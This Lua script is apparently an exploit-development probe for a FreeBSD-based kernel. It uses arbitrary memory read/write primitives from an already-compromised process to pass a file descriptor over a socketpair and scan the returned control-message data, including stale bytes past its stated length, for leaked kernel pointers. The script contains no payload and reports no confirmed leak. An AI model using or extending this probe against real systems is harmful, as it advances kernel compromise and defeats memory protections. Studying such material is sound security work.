-- CRASH_CLASS: LOW
-- Isolated corrected SCM_RIGHTS ancillary copyout.
print("=== PROBE 108c: SCM_RIGHTS CMSG ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then return true end
    return false
end

local SYS_close      = 6
local SYS_getpid     = 20
local SYS_recvmsg    = 27
local SYS_sendmsg    = 28
local SYS_socket     = 97
local SYS_setsockopt = 105
local SYS_socketpair = 135
local SYS_kqueue     = 362
local SYS_kevent     = 363

local AF_LOCAL      = 1
local SOCK_STREAM   = 1
local SOL_SOCKET    = 0xFFFF
local SCM_RIGHTS    = 1
local SOL_LOCAL     = 0
local LOCAL_CREDS   = 2

-- CMSG layout (FreeBSD amd64): CMSG_ALIGN(sizeof(struct cmsghdr)) = 16
local CMSG_DATA_OFF = 16

local pid = to_num(make_syscall(SYS_getpid)())
print("pid: " .. pid)
print("")

----------------------------------------------------------------
-- Helpers
----------------------------------------------------------------
local function create_socketpair()
    local sv = memory.alloc(8)
    safe_wd(sv, 0)
    safe_wd(sv + 4, 0)
    local ok, ret = pcall(function()
        return make_syscall(SYS_socketpair)(uint64(AF_LOCAL), uint64(SOCK_STREAM),
            uint64(0), uint64(sv))
    end)
    if not ok then return nil, nil end
    if to_num(ret) ~= 0 then return nil, nil end
    return safe_rd(sv), safe_rd(sv + 4)
end

local function close_fd(fd)
    if fd == nil then return end
    pcall(function() make_syscall(SYS_close)(uint64(fd)) end)
end

local function send_fd_over(sock_fd, fd_to_send)
    local iov_data = memory.alloc(8)
    safe_wd(iov_data, 0x41) -- 'A'
    local iov = memory.alloc(0x10)
    safe_wq(iov, uint64(iov_data))
    safe_wq(iov + 8, uint64(1))

    local cmsg = memory.alloc(0x20)
    for i = 0, 0x1F, 4 do safe_wd(cmsg + i, 0) end
    safe_wd(cmsg, 20)               -- cmsg_len = CMSG_LEN(4) = 16+4
    safe_wd(cmsg + 4, SOL_SOCKET)
    safe_wd(cmsg + 8, SCM_RIGHTS)
    safe_wd(cmsg + CMSG_DATA_OFF, fd_to_send)

    local msg = memory.alloc(0x30)
    for i = 0, 0x2F, 4 do safe_wd(msg + i, 0) end
    safe_wq(msg, uint64(0))
    safe_wd(msg + 8, 0)
    safe_wq(msg + 0x10, uint64(iov))
    safe_wd(msg + 0x18, 1)
    safe_wq(msg + 0x20, uint64(cmsg))
    safe_wd(msg + 0x28, 24)         -- CMSG_SPACE(4) = 16+8
    safe_wd(msg + 0x2C, 0)

    local ok, ret = pcall(function()
        return make_syscall(SYS_sendmsg)(uint64(sock_fd), uint64(msg), uint64(0))
    end)
    if not ok then return nil end
    return to_num(ret)
end

local function recv_fd_from(sock_fd, buf_sz)
    buf_sz = buf_sz or 0x100
    local iov_data = memory.alloc(8)
    safe_wd(iov_data, 0)
    local iov = memory.alloc(0x10)
    safe_wq(iov, uint64(iov_data))
    safe_wq(iov + 8, uint64(1))

    local cmsg = memory.alloc(buf_sz)
    for i = 0, buf_sz - 1, 4 do safe_wd(cmsg + i, 0xDEADBEEF) end

    local msg = memory.alloc(0x30)
    for i = 0, 0x2F, 4 do safe_wd(msg + i, 0) end
    safe_wq(msg, uint64(0))
    safe_wd(msg + 8, 0)
    safe_wq(msg + 0x10, uint64(iov))
    safe_wd(msg + 0x18, 1)
    safe_wq(msg + 0x20, uint64(cmsg))
    safe_wd(msg + 0x28, buf_sz)
    safe_wd(msg + 0x2C, 0)

    local ok, ret = pcall(function()
        return make_syscall(SYS_recvmsg)(uint64(sock_fd), uint64(msg), uint64(0))
    end)
    if not ok then return nil, cmsg, nil, nil end
    local controllen = safe_rd(msg + 0x28) or 0
    local received_fd = nil
    local offset = 0
    while offset + CMSG_DATA_OFF <= controllen do
        local length = safe_rd(cmsg + offset) or 0
        if length < CMSG_DATA_OFF or offset + length > controllen then break end
        local level = safe_rd(cmsg + offset + 4)
        local ctype = safe_rd(cmsg + offset + 8)
        if level == SOL_SOCKET and ctype == SCM_RIGHTS and length >= CMSG_DATA_OFF + 4 then
            received_fd = safe_rd(cmsg + offset + CMSG_DATA_OFF)
            break
        end
        offset = offset + math.floor((length + 7) / 8) * 8
    end
    return received_fd, cmsg, to_num(ret), controllen
end

-- SECTION B: cmsg deep scan for kernel pointer leaks
-- ============================================================
print("--- SECTION B: CMSG DEEP SCAN ---")
print("")

repeat
    local fd_a, fd_b = create_socketpair()
    if fd_a == nil then print("[B] socketpair FAILED"); break end

    local ok_s, test_fd = pcall(function()
        return to_num(make_syscall(SYS_socket)(uint64(AF_LOCAL), uint64(SOCK_STREAM), uint64(0)))
    end)
    if not ok_s or test_fd < 0 then
        print("[B] test socket FAILED")
        close_fd(fd_a); close_fd(fd_b); break
    end

    -- Enable LOCAL_CREDS to get extra cmsg data from kernel
    local one_buf = memory.alloc(4)
    safe_wd(one_buf, 1)
    local ok_opt, opt_rv = pcall(function()
        return to_num(make_syscall(SYS_setsockopt)(uint64(fd_a), uint64(SOL_LOCAL),
            uint64(LOCAL_CREDS), uint64(one_buf), uint64(4)))
    end)
    print("[B] LOCAL_CREDS setsockopt: ok=" .. tostring(ok_opt) .. " rv=" .. tostring(opt_rv))

    local srv = send_fd_over(fd_b, test_fd)
    print("[B] sendmsg ret=" .. tostring(srv))
    if srv == nil or srv < 0 then
        print("[B] sendmsg FAILED")
        close_fd(fd_a); close_fd(fd_b); close_fd(test_fd); break
    end

    local recv_fd, cmsg_buf, rrv, clen = recv_fd_from(fd_a, 0x200)
    print("[B] recvmsg ret=" .. tostring(rrv) .. " controllen=" .. tostring(clen))
    print("[B] received fd=" .. tostring(recv_fd))

    local kptr_count = 0
    local interesting = 0
    if clen ~= nil and clen > 0 then
        print("[B] scanning " .. clen .. " bytes of cmsg data:")
        local offset = 0
        while offset < clen do
            local cmsg_len   = safe_rd(cmsg_buf + offset)
            local cmsg_level = safe_rd(cmsg_buf + offset + 4)
            local cmsg_type  = safe_rd(cmsg_buf + offset + 8)
            print("[B]   cmsg@+" .. string.format("%02X", offset) ..
                  " len=" .. tostring(cmsg_len) ..
                  " level=0x" .. string.format("%X", cmsg_level or 0) ..
                  " type=" .. tostring(cmsg_type))

            if cmsg_len == nil or cmsg_len < 12 then break end
            local aligned = cmsg_len
            if aligned % 8 ~= 0 then aligned = aligned + (8 - aligned % 8) end

            for i = 0, aligned - 1, 8 do
                local qv = safe_rq(cmsg_buf + offset + i)
                if qv ~= nil then
                    local h, l = get_hi_lo(qv)
                    local m = ""
                    if is_kptr(qv) then
                        m = " *** KERNEL POINTER ***"
                        kptr_count = kptr_count + 1
                    elseif h ~= 0 and h ~= 0xFFFFFFFF and h ~= 0xDEADBEEF then
                        m = " [non-zero-hi]"
                        interesting = interesting + 1
                    end
                    print("[B]     +" .. string.format("%02X", offset + i) .. ": " .. fmt_addr(qv) .. m)
                end
            end
            offset = offset + aligned
        end

        -- Scan past stated controllen for stale heap data
        print("[B] past-controllen scan:")
        for i = clen, math.min(clen + 64, 0x1FF), 8 do
            local qv = safe_rq(cmsg_buf + i)
            if qv ~= nil then
                local h, l = get_hi_lo(qv)
                if h ~= 0xDEADBEEF and (h ~= 0 or l ~= 0) then
                    local m = ""
                    if is_kptr(qv) then
                        m = " *** KERNEL POINTER ***"; kptr_count = kptr_count + 1
                    end
                    print("[B]     +" .. string.format("%02X", i) .. ": " .. fmt_addr(qv) .. m)
                end
            end
        end
    end
    print("[B] kernel ptrs: " .. kptr_count .. "  interesting: " .. interesting)

    close_fd(recv_fd); close_fd(test_fd); close_fd(fd_a); close_fd(fd_b)
until true
print("")

print("=== PROBE 108c COMPLETE ===")
